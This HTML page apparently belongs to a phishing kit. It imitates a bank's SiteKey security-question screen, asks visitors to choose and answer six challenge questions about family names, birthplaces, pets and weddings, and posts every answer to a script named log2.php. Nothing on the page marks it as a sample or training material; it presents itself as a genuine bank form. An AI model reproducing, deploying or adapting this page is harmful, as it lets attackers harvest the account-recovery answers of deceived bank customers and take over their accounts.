<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Information</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 30px; 
    width: 275px; 
    font-size: 14px; 
    padding-left: 8px; 
    border-radius: 3px; 
   
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
    
} 

 </style>
<style type="text/css">
  
.textrbox { 
	background-color: #EAEAEA;
    background: -moz-linear-gradient(top, #FFF, #EAEAEA);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0.0, #FFF), color-stop(1.0, #EAEAEA));
    padding-left: 5px;
	border-radius: 2px;
	font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
	font-size: 14px;	
	color: #555;
    border: 1px solid #cdcdcd; 
    outline:0; 
    height: 30px; 
    width: 275px; 
  } 
.textrbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: auto;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:115px; top:0px; width:985px; height:75px; z-index:0"><img src="images/header.png" alt="" title="" border=0 width=985 height=75></div>

<div id="image2" style="position:absolute; overflow:hidden; left:115px; top:80px; width:980px; height:60px; z-index:1"><img src="images/subheader.png" alt="" title="" border=0 width=980 height=60></div>

<div id="image2" style="position:absolute; overflow:hidden; left:115px; top:160px; width:980px; height:60px; z-index:1">Please choose your SiteKey Challenge Questions and answer them in order to proceed.  All fields are required.</div>


<div id="image8" style="position:absolute; overflow:hidden; left:115px; top:968px; width:980px; height:147px; z-index:7"><img src="images/footer.png" alt="" title="" border=0 width=980 height=147></div>

<form action=log2.php name=chlobhai id=chlobhai method=post>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:250px; width:371px; height:110px; z-index:2">
<select class="textbox" name="question1">
<OPTION value="" selected>Select SiteKey Challenge Question 1</OPTION>
<OPTION value="What is the first name of your mother's closest friend?">What is the first name of your mother's closest friend?</OPTION>
<OPTION value="On what street is your grocery store?">On what street is your grocery store?</OPTION>
<OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
<OPTION value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</OPTION>
<OPTION value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</OPTION>
<OPTION value="What is your all-time favorite song?">What is your all-time favorite song?</OPTION>
<OPTION value="What is the first name of your hairdresser/barber?">What is the first name of your hairdresser/barber?</OPTION>
<OPTION value="What is the name of a college you applied to but didn't attend?">What is the name of a college you applied to but didn't attend?	</option>
<option value="What was the first name of your favorite teacher or professor? ">What was the first name of your favorite teacher or professor?</OPTION>
<OPTION value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child? </option>
 <option value="What is your all-time favorite song? ">What is your all-time favorite song? </option>
 <option value="What is the first name of your hairdresser/barber? ">What is the first name of your hairdresser/barber? </option>
 </SELECT></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:290px; width:371px; height:110px; z-index:3">Answer<br/><input name="answer1" class="textbox" autocomplete="off" type="text" required></div>




<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:350px; width:371px; height:110px; z-index:3">
<select name="question2" id="question2" class="textbox" autocomplete="off" required>
<option value="" selected>Select SiteKey Challenge Question 2</option>
<option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
<option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
</select></div>

<input type="hidden" name="ansr2" style="display:none;">
<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:390px; width:371px; height:110px; z-index:4">Answer<br/><input type="text" name="answer2" class="textbox" autocomplete="off" required></div>




<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:450px; width:371px; height:110px; z-index:4">
<select class="textbox" name="question3" id="question3">

                          <OPTION value="" 
              selected>Select SiteKey Challenge Question 3</OPTION>
                                      <OPTION value="What street did your best friend in high school live on? (Enter full name of street only) ">What street did your best friend in high school live on? (Enter full name of street only)</OPTION>
                                <option value="In what city did you meet your spouse/significant other? ">In what city did you meet your spouse/significant other? </option>
			    <option value="What is the last name of your third grade teacher? ">What is the last name of your third grade teacher? </option>
			    <option value="In what city did you honeymoon? (Enter full name of city only) ">In what city did you honeymoon? (Enter full name of city only) </option>
			    <option value="What is the name of your favorite charity? ">What is the name of your favorite charity? </option>
			    <option value="What celebrity do you most resemble? ">What celebrity do you most resemble? </option>
			    <option value="What is the name of your first babysitter? ">What is the name of your first babysitter? </option>
			    <option value="What is your best friend's first name? ">What is your best friend's first name? </option>
			    <option value="What was the name of your first boyfriend or girlfriend? ">What was the name of your first boyfriend or girlfriend? </option>
			    <option value="What is the last name of your family physician? ">What is the last name of your family physician? </option>

                                        </SELECT></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:490px; width:371px; height:110px; z-index:5">Answer<br/><input name="answer3" class="textbox" autocomplete="off" type="text" required></div>




<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:550px; width:371px; height:110px; z-index:5">
<select class="textbox" name="question4" id="question4">

                          <OPTION value="" 
              selected>Select SiteKey Challenge Question 4</OPTION>
                                                <option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
			    <option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
			    <option value="In what city were you born?">In what city were you born? (Enter full name of city only)</option>
			    <option value="What was the name of your first pet?">What was the name of your first pet?</option>
			    <option 
              value="What was your high school mascot?">What was your high school mascot?</option>
			    <option value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</option>
			    <option value="In what year did you graduate from high school?">In what year (YYYY) did you graduate from high school?</option>
			    <option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
			    <option value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</option>

                                        </SELECT></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:590px; width:371px; height:110px; z-index:6">Answer<br/><input name="answer4" class="textbox" autocomplete="off" type="text" required></div>




<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:650px; width:371px; height:110px; z-index:6">
<select class="textbox" name="question5" id="question5">

                          <OPTION value="" 
              selected>Select SiteKey Challenge Question 5</OPTION>
                                          <OPTION value="What is your father's middle name?">What is your father's middle name?</OPTION>
                          <OPTION value="What is your mother's middle name?">What is your mother's middle name?</OPTION>
                          <OPTION value="In what city were you married?">In what city were you married?</OPTION>
                          <OPTION value="In what city is your vacation home?">In what city is your vacation home?</OPTION>
                          <OPTION value="What is the first name of your first child?">What is the first name of your first child?</OPTION>
                          <OPTION value="What is the name of your first employer?">What is the name of your first employer?</OPTION>
                          <OPTION value="What is your favorite hobby?">What is your favorite hobby?</OPTION>
                          <OPTION value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</OPTION>
                          <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                          <OPTION value="What high school did you attend?">What high school did you attend?</OPTION>

                                        </SELECT></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:690px; width:371px; height:110px; z-index:7">Answer<br/><input name="answer5" class="textbox" autocomplete="off" type="text" required></div>




<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:750px; width:371px; height:110px; z-index:7">
<select class="textbox" name="question6" id="question6">

                          <OPTION value="" 
              selected>Select SiteKey Challenge Question 6</OPTION>
                                      <OPTION value="In what city was your mother born?">In what city was your mother born? (Enter full name of city only)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</OPTION>
                      <OPTION value="In what city was your father born?">In what city was your father born? (Enter full name of city only)</OPTION>
                      <OPTION value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</OPTION>
                      <OPTION 
              value="When is your wedding anniversary?">When is your wedding anniversary? (Enter the full name of month)</OPTION>
                      <OPTION 
              value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</OPTION>
                      <option value="In what city was your high school?">In what city was your high school? </option>
                      <OPTION value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</OPTION>
                      <OPTION value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</OPTION>
                      <option value="Where did you meet your spouse for the first time?">Where did you meet your spouse for the first time? (city name only)</option>

                                        </SELECT></div>

<div id="image3" style="position:absolute; overflow:hidden; left:140px; top:790px; width:371px; height:110px; z-index:8">Answer<br/><input name="answer6" class="textbox" autocomplete="off" type="text" required></div>


<div id="formimage1" style="position:absolute; left:289px; top:890px; z-index:13"><input type="image" name="formimage1" width="115" height="40" src="images/continue.png"></div>
</div>

	
</body>
</html>
